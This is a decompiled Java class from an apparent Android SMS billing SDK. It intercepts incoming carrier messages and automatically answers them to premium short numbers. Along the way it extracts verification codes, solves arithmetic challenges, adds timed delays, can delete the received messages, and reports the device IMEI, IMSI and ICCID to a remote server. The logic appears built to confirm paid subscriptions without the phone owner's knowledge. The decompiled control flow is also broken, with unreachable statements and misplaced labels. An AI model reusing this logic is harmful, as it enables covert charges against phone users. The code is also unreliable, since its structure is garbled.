package com.upay.billing.engine.upay;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.SharedPreferences;
import android.util.Log;
import com.upay.billing.MtContext;
import com.upay.billing.UpayConstant;
import com.upay.billing.UpayContext;
import com.upay.billing.UpayCore;
import com.upay.billing.bean.Cmd;
import com.upay.billing.bean.Op;
import com.upay.billing.bean.Plan;
import com.upay.billing.bean.Trade;
import com.upay.billing.engine.CommonEngine;
import com.upay.billing.utils.HttpRunner;
import com.upay.billing.utils.Json;
import com.upay.billing.utils.NativeUtil;
import com.upay.billing.utils.Util;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.Iterator;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Random;
import java.util.Stack;
import java.util.Timer;
import java.util.TimerTask;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import org.json.JSONObject;

public class Main
  extends CommonEngine
{
  private static final int Analyze_Action_Fail = 131;
  private static final int H5_BillingSms_Fail = 156;
  private static final int H5_LoginSms_Fail = 155;
  private static final int Http_Verify_Fail = 154;
  private static final String MODEM_POOL_LOG_URL = "http://api.upay360.cn/function/modem_pool/log.jsp";
  private static final String REPLY_VERIFY_URL = UpayConstant.API_BASE_URL + "plan/dynconfirm";
  private static final String SAVE_NAME = "com.upay.billing.saveddata.Main";
  private static final String TAG = "Upay";
  private static char[] charSet = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".toCharArray();
  private static final String dtsmsUrl = UpayConstant.API_BASE_URL + "plan/dyncode";
  private Trade mTrade;
  private List<String> sendFail;
  private List<String> sendSucc;
  private ArrayList<Json> tradeList;
  private boolean verifyFlag = true;
  private List<String> verifySendFail;
  private List<String> verifySendSucc;
  private Timer waitVerifyTimer = null;
  private TimerTask waitVerifyTimerTask = new Main.1(this);
  
  public Main() {}
  
  private int getCmdType(String paramString)
  {
    Object localObject1 = this.core.getContext().getSharedPreferences("com.upay.billing.saveddata.Main", 0).getString("cmdType", null);
    if (localObject1 != null) {
      try
      {
        localObject1 = (HashMap)Util.unserialize((String)localObject1);
      }
      catch (Exception localException)
      {
        for (;;)
        {
          try
          {
            int i = ((Integer)((HashMap)localObject1).get(paramString)).intValue();
            return i;
          }
          catch (Exception paramString) {}
          localException = localException;
          Object localObject2 = null;
        }
      }
    } else {
      return 0;
    }
    return 0;
  }
  
  private Json getParams(Trade paramTrade)
  {
    Json localJson = Json.parse("{}");
    localJson.put("imei", this.core.getUpayContext().imei);
    localJson.put("imsi", this.core.getUpayContext().imsi);
    localJson.put("iccid", this.core.getUpayContext().iccid);
    localJson.put("user_id", Long.valueOf(paramTrade.uid));
    localJson.put("package_name", this.core.getContext().getPackageName());
    return localJson;
  }
  
  public static int getRandom(int paramInt1, int paramInt2)
  {
    return new Random().nextInt(paramInt2) % (paramInt2 - paramInt1 + 1) + paramInt1;
  }
  
  @SuppressLint({"UseValueOf"})
  private String shortenSerialNo(String paramString, int paramInt)
  {
    paramString = Long.valueOf(paramString);
    Stack localStack = new Stack();
    StringBuilder localStringBuilder = new StringBuilder(0);
    while (paramString.longValue() != 0L)
    {
      localStack.add(Character.valueOf(charSet[new Long(paramString.longValue() - paramString.longValue() / 62L * 62L).intValue()]));
      paramString = Long.valueOf(paramString.longValue() / 62L);
    }
    while (!localStack.isEmpty()) {
      localStringBuilder.append(localStack.pop());
    }
    int j = localStringBuilder.length();
    paramString = new StringBuilder();
    int i = 0;
    while (i < paramInt - j)
    {
      paramString.append('0');
      i += 1;
    }
    return paramString.toString() + localStringBuilder.toString();
  }
  
  private String time(String paramString)
  {
    return Util.formatDate(paramString, new Date(Util.getTs() + Util.getLong(this.core.getContext(), "Time-Diff")));
  }
  
  private boolean verifyCondition(String paramString1, String paramString2)
  {
    boolean bool = false;
    try
    {
      paramString2 = this.core.getPropString("common", paramString2, "");
      if (!Util.empty(paramString2)) {
        bool = Pattern.compile(paramString2).matcher(paramString1).find();
      }
      return bool;
    }
    catch (Exception paramString1) {}
    return false;
  }
  
  public Op getOp()
  {
    switch (this.key.charAt(4))
    {
    default: 
      throw new IllegalStateException();
    case 'c': 
      return Op.CMCC;
    case 'u': 
      return Op.UNICOM;
    }
    return Op.TELECOM;
  }
  
  public boolean hasCustomConfirmUi()
  {
    return false;
  }
  
  public boolean isAvailable(Op paramOp, boolean paramBoolean1, boolean paramBoolean2, boolean paramBoolean3, boolean paramBoolean4)
  {
    return paramBoolean1;
  }
  
  public boolean isComposable()
  {
    return true;
  }
  
  @SuppressLint({"DefaultLocale"})
  public int onMtAction(MtContext paramMtContext, Json paramJson, String paramString1, String paramString2, String[] paramArrayOfString)
  {
    Log.i("Upay", "onMtAction: exec=" + paramJson.asObject() + ",mtNum=" + paramString1 + ",mtMsg=" + paramString2);
    Context localContext = this.core.getContext();
    Trade localTrade = paramMtContext.trade;
    Cmd localCmd = paramMtContext.cmd;
    Json localJson = localTrade.getSubTrade(localCmd.key);
    String str2 = localTrade.appKey;
    String str1 = localTrade.id;
    Object localObject1 = localTrade.goodsKey;
    Object localObject2 = localCmd.key;
    String str3 = localCmd.btKey;
    if (localCmd.deleteMt) {}
    for (int i = 1;; i = 0)
    {
      localObject1 = Json.createObject(new Object[] { "trade_id", str1, "goods_key", localObject1, "cmd_key", localObject2, "bt_key", str3, "delete_mt", Integer.valueOf(i), "description", "", "mt_msg", paramString2, "mt_num", paramString1, "result", Integer.valueOf(200), "sn", localJson.getStr("sn"), "up_msg", "", "up_num", "" });
      localObject2 = Json.createObject(new Object[] { "trade_id", localTrade.id, "goods_key", localTrade.goodsKey, "cmd_key", localCmd.key, "bt_key", localCmd.btKey, "description", "upay", "mt_msg", "", "mt_num", "", "sn", localJson.getStr("sn") });
      switch (Main.7.$SwitchMap$com$upay$billing$engine$upay$Main$ExecType[Main.ExecType.valueOf(paramJson.getStr("type").toUpperCase()).ordinal()])
      {
      default: 
        return 0;
      }
    }
    if ((localJson.getInt("state") & 0x4) != 0) {
      return 524288;
    }
    paramString1 = paramJson.getStr("num", "$mt_num").replace("$mt_num", paramString1);
    if (localCmd.key.contains(paramJson.getStr("ckey", "default")))
    {
      paramString1 = localCmd.num.split(",");
      if (paramString1.length > 1) {
        paramString1 = paramString1[getRandom(0, paramString1.length)];
      }
    }
    else
    {
      localJson.put("state", Integer.valueOf(localJson.getInt("state") | 0x4));
      str1 = "";
      if (!Util.empty(paramJson.getStr("mode"))) {
        break label733;
      }
    }
    for (paramString2 = paramJson.getStr("msg").replace("$last_mo_msg", paramMtContext.moMsg);; paramString2 = paramJson.getStr("msg").replace("$last_mo_msg", paramString2))
    {
      i = paramArrayOfString.length;
      for (;;)
      {
        i -= 1;
        if (i < 0) {
          break;
        }
        paramString2 = paramString2.replace("$" + (i + 1), paramArrayOfString[i]).replace("$uid", String.valueOf(localTrade.uid)).replace("$serialNo", paramMtContext.serialNo);
      }
      paramString1 = localCmd.num;
      break;
      label733:
      paramString2 = paramMtContext.moMsg.substring(0, paramMtContext.moMsg.indexOf("#"));
    }
    Util.saveString(this.core.getContext(), "verifycode", paramString2);
    paramMtContext = paramString2;
    if (!Util.empty(paramJson.getStr("reply_msg"))) {
      paramMtContext = paramJson.getStr("reply_msg").replace("$minSn", Util.shortenSn(localJson.getStr("sn"), false)).replace("$verify_code", paramString2);
    }
    paramString2 = str1;
    if (!Util.empty(paramJson.getStr("charge"))) {
      paramString2 = "0";
    }
    paramJson = new int[120];
    paramArrayOfString = this.core.getPropString("upay", "mp_delay_reply_tag", "0");
    str1 = this.core.getPropString("upay", "mp_reply_num", "1065889920001");
    str3 = this.core.getPropString("upay", "sw_reply_num", "106588995604");
    long l;
    if (("1".equals(paramArrayOfString)) && ((str1.equals(paramString1)) || (str3.equals(paramString1)))) {
      l = getRandom(6, 8) * 1000;
    }
    try
    {
      Thread.sleep(l);
      if (this.verifyFlag) {
        new Main.3(this, localContext, paramString1, paramMtContext, paramString2, paramJson, localCmd, localTrade, str2, (Json)localObject1, localJson, (Json)localObject2).run();
      }
      return 524288;
      paramString2 = paramJson.getStr("num", "$mt_num").replace("$mt_num", paramString1);
      if (Util.empty(paramJson.getStr("mode"))) {}
      for (paramString1 = paramJson.getStr("msg").replace("$last_mo_msg", paramMtContext.moMsg);; paramString1 = paramJson.getStr("msg").replace("$last_mo_msg", paramString1))
      {
        i = paramArrayOfString.length;
        for (;;)
        {
          i -= 1;
          if (i < 0) {
            break;
          }
          paramString1 = paramString1.replace("$" + (i + 1), paramArrayOfString[i]).replace("$uid", String.valueOf(localTrade.uid)).replace("$serialNo", paramMtContext.serialNo);
        }
        paramString1 = paramMtContext.moMsg.substring(0, paramMtContext.moMsg.indexOf("#"));
      }
      Util.saveString(this.core.getContext(), "verifycode", paramString1);
      paramMtContext = new int[120];
      paramArrayOfString = this.core.getPropString("upay", "mp_delay_reply_tag", "0");
      str1 = this.core.getPropString("upay", "mp_reply_num", "1065889920001");
      str3 = this.core.getPropString("upay", "sw_reply_num", "106588995604");
      if (("1".equals(paramArrayOfString)) && ((str1.equals(paramString2)) || (str3.equals(paramString2)))) {
        l = getRandom(6, 8) * 1000;
      }
    }
    catch (InterruptedException paramArrayOfString)
    {
      try
      {
        Thread.sleep(l);
        new Main.4(this, localContext, paramString2, paramString1, "", paramMtContext, localJson, str2, (Json)localObject1, localTrade, paramJson, (Json)localObject2, localCmd).run();
        return 524288;
        if ((localJson.getInt("state") & 0x4) != 0) {
          return 524288;
        }
        paramMtContext = paramJson.getStr("msg").replace("$last_mo_msg", paramMtContext.moMsg);
        i = paramArrayOfString.length;
        for (;;)
        {
          i -= 1;
          if (i < 0) {
            break;
          }
          paramMtContext = paramMtContext.replace("$" + (i + 1), paramArrayOfString[i]);
        }
        l = getRandom(6, 8) * 1000;
      }
      catch (InterruptedException paramArrayOfString)
      {
        try
        {
          for (;;)
          {
            Thread.sleep(l);
            if (this.verifyFlag)
            {
              paramJson = new HashMap();
              paramJson.put("ts", Long.toString(System.currentTimeMillis() + Util.getLong(this.core.getContext(), "Time-Diff")));
              paramJson.put("app_key", localTrade.appKey);
              paramJson.put("app_secret", this.core.getPlan(localTrade.appKey).appSecret);
              paramString1 = NativeUtil.genHash(paramJson);
              paramJson.remove("app_secret");
              paramJson.put("hash", paramString1);
              paramJson = Util.mapToJson(paramJson);
              paramJson.put("params", getParams(localTrade));
              paramString1 = new ArrayList();
              paramString2 = Json.parse("{}");
              paramString2.put("sn", localJson.getStr("sn"));
              paramString2.put("cmd_key", localJson.getStr("cmd_key"));
              paramString2.put("security_code", paramMtContext);
              paramString1.add(paramString2);
              paramJson.put("codes", Json.asJSONArray(paramString1));
              paramJson = Util.stringToBytes(paramJson.asObject().toString());
              Util.addTask(new Main.5(this, REPLY_VERIFY_URL, localCmd, localTrade, str2, (Json)localObject1, paramMtContext, localJson, (Json)localObject2).setDoPost().setPostData(paramJson).addHeader("Content-Type", "application/json"));
            }
            return 524288;
            if ((localJson.getInt("state") & 0x4) != 0) {
              return 524288;
            }
            paramString1 = paramJson.getStr("num", "$mt_num").replace("$mt_num", paramString1);
            paramJson = paramJson.getStr("msg", "$1,$2,$3").split(",");
            i = Integer.parseInt(paramJson[0]);
            int j = Integer.parseInt(paramJson[2]);
            paramMtContext = "";
            switch ("+-*/".indexOf(paramJson[1]))
            {
            }
            for (;;)
            {
              new Main.6(this, localContext, paramString1, paramMtContext, "", localJson, str2, (Json)localObject1).run();
              return 524288;
              paramMtContext = Integer.toString(i + j);
              continue;
              paramMtContext = Integer.toString(i - j);
              continue;
              paramMtContext = Integer.toString(i * j);
              continue;
              paramMtContext = Integer.toString(i / j);
            }
            return 524288;
            return 65736;
            return 0x10000 | paramJson.getInt("code");
            paramArrayOfString = paramArrayOfString;
          }
          paramArrayOfString = paramArrayOfString;
        }
        catch (InterruptedException paramJson)
        {
          for (;;) {}
        }
      }
    }
  }
  
  public void pay(Trade paramTrade, List<Cmd> paramList)
  {
    Util.saveString(this.core.getContext(), "verifycode", "");
    this.verifyFlag = true;
    LinkedHashMap localLinkedHashMap1 = new LinkedHashMap();
    LinkedHashMap localLinkedHashMap2 = new LinkedHashMap();
    LinkedHashMap localLinkedHashMap3 = new LinkedHashMap();
    this.sendSucc = new ArrayList();
    this.sendFail = new ArrayList();
    this.tradeList = new ArrayList();
    this.verifySendSucc = new ArrayList();
    this.verifySendFail = new ArrayList();
    this.mTrade = paramTrade;
    Iterator localIterator1 = Util.safeIter(paramTrade.subTrades).iterator();
    Json localJson;
    String str;
    Cmd localCmd;
    if (localIterator1.hasNext())
    {
      localJson = (Json)localIterator1.next();
      str = localJson.getStr("sn");
      Iterator localIterator2 = paramList.iterator();
      do
      {
        if (!localIterator2.hasNext()) {
          break;
        }
        localCmd = (Cmd)localIterator2.next();
      } while (!localCmd.key.equals(localJson.getStr("cmd_key")));
    }
    for (;;)
    {
      if (!localCmd.btKey.contains("upay"))
      {
        localJson = Json.parse("{}");
        localJson.put("sn", str);
        localJson.put("cmd_key", localCmd.key);
        this.tradeList.add(localJson);
        localLinkedHashMap2.put(str, localCmd);
      }
      localLinkedHashMap1.put(str, localCmd);
      break;
      new Thread(new Main.2(this, paramTrade, localLinkedHashMap3, localLinkedHashMap2, localLinkedHashMap1)).start();
      return;
      localCmd = null;
    }
  }
}
